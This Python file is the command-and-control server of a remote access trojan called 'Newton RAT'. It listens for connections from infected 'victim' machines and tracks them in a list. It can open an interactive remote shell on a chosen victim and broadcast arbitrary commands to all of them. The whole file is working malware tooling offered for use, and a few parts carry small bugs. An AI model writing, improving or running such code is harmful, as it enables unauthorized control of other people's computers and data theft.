import socket
from threading import Thread
import sys
import time
from local_libs.config import parse_config

victims_sockets = []
victims_connections_log = []
current_victim = None


class Socket:
    @staticmethod
    def get_ip(sock):
        return sock.getpeername()[0]


class Cli:
    def __init__(self):
        self.cli_commands = [
            ("Show server commands", self.__show_server_commands),
            ("List of victims", self.__print_list_of_victims),
            ("Connect to victim", self.__connect_to_victim),
            ("Send command to all victims", self.__send_all),
            ("Exit", self.__exit)
        ]

    def start(self):
        self.greetings()
        self.handle()

    def greetings(self):
        print("\nWelcome to server control of Newton RAT!\n")
        self.__show_server_commands()

    def handle(self):
        while True:
            self.__show_connections_log()
            try:
                command_number = int(input("Enter commands number >>> "))
                command_method = self.cli_commands[command_number][1]
                command_method()
            except Exception:
                print("Wrong command!")

    def __show_server_commands(self):
        print("You can use commands below:")

        for n, c in zip(range(len(self.cli_commands)), [c[0] for c in self.cli_commands]):
            print(f"({n}) {c}")
        print("")

    def __show_connections_log(self):
        global victims_connections_log
        for address in victims_connections_log:
            print(f"[+] {address} connected")
            victims_connections_log.remove(address)

    def __print_list_of_victims(self):
        global victims_sockets
        if len(victims_sockets) != 0:
            for v_socket in victims_sockets:
                print("Victims ip addresses list:")
                print(Socket.get_ip(v_socket))
        else:
            print("There are no victims")

    def __connect_to_victim(self):
        global current_victim
        victim_ip = input("Enter victims ip >>> ")
        v_socket = Server.get_socket_by_ip(victim_ip)
        if v_socket:
            current_victim = victim_ip
            print(f"Successful connected to {victim_ip}")
            v_socket.send("start shell".encode("utf-8"))
            print(v_socket.recv(1024 * 4).decode("utf-8"), end="")
            while True:
                command = input()
                if command == "exit":
                    print("Exiting...")
                    break
                elif command.find("change config") == 0:
                    command = command.split(" ")
                    new_config = parse_config(command[-1])
                    command[-1] = new_config
                    command = " ".join(command)
                v_socket.send(command.encode("utf-8"))
                print(v_socket.recv(1024 * 1024).decode("utf-8"), end="")
        else:
            print(f"IP {victim_ip} not founded")
        current_victim = None

    def __send_all(self):
        command = input("Enter command >> ")
        for v_socket in victims_sockets:
            v_socket.send(command.encode("utf-8"))
            print(f"{Socket.get_ip(v_socket)} accepted command")

    def __exit(self):
        global victims_sockets
        for v_socket in victims_sockets:
            v_socket.close()
        sys.exit(0)


class Server:
    def __init__(self, SERVER_IP, SERVER_PORT):
        self.SERVER_IP = SERVER_IP
        self.SERVER_PORT = SERVER_PORT
        self.s = None

    def run(self):
        self.s = socket.socket()
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.SERVER_IP, self.SERVER_PORT))
        self.s.listen()

        print(f"[*] Listening as {self.SERVER_IP}:{self.SERVER_PORT}")

        t1 = Thread(target=self.accepting_victims, args=())
        t1.daemon = True
        t1.start()

        t2 = Thread(target=self.check_available_victims, args=())
        t2.daemon = True
        t2.start()

    def accepting_victims(self):
        global victims_sockets
        while True:
            v_socket, v_address = self.s.accept()
            # print(f"\n[+] {v_address[0]} connected")
            victims_connections_log.append(v_address[0])
            victims_sockets.append(v_socket)

    def check_available_victims(self):
        global victims_sockets, current_victim
        while True:
            for v_socket in victims_sockets:
                if Socket.get_ip(v_socket) == current_victim:  # doesn't work
                    continue
                else:
                    try:
                        v_socket.send("hello".encode())
                    except:
                        v_socket.close()
                        victims_sockets.remove(v_socket)
                time.sleep(1)

    @staticmethod
    def get_socket_by_ip(ip):
        global victims_sockets
        for v_socket in victims_sockets:
            if Socket.get_ip(v_socket) == ip:
                return v_socket
        return None


if __name__ == "__main__":
    Server("0.0.0.0", 8888).run()
    Cli().start()
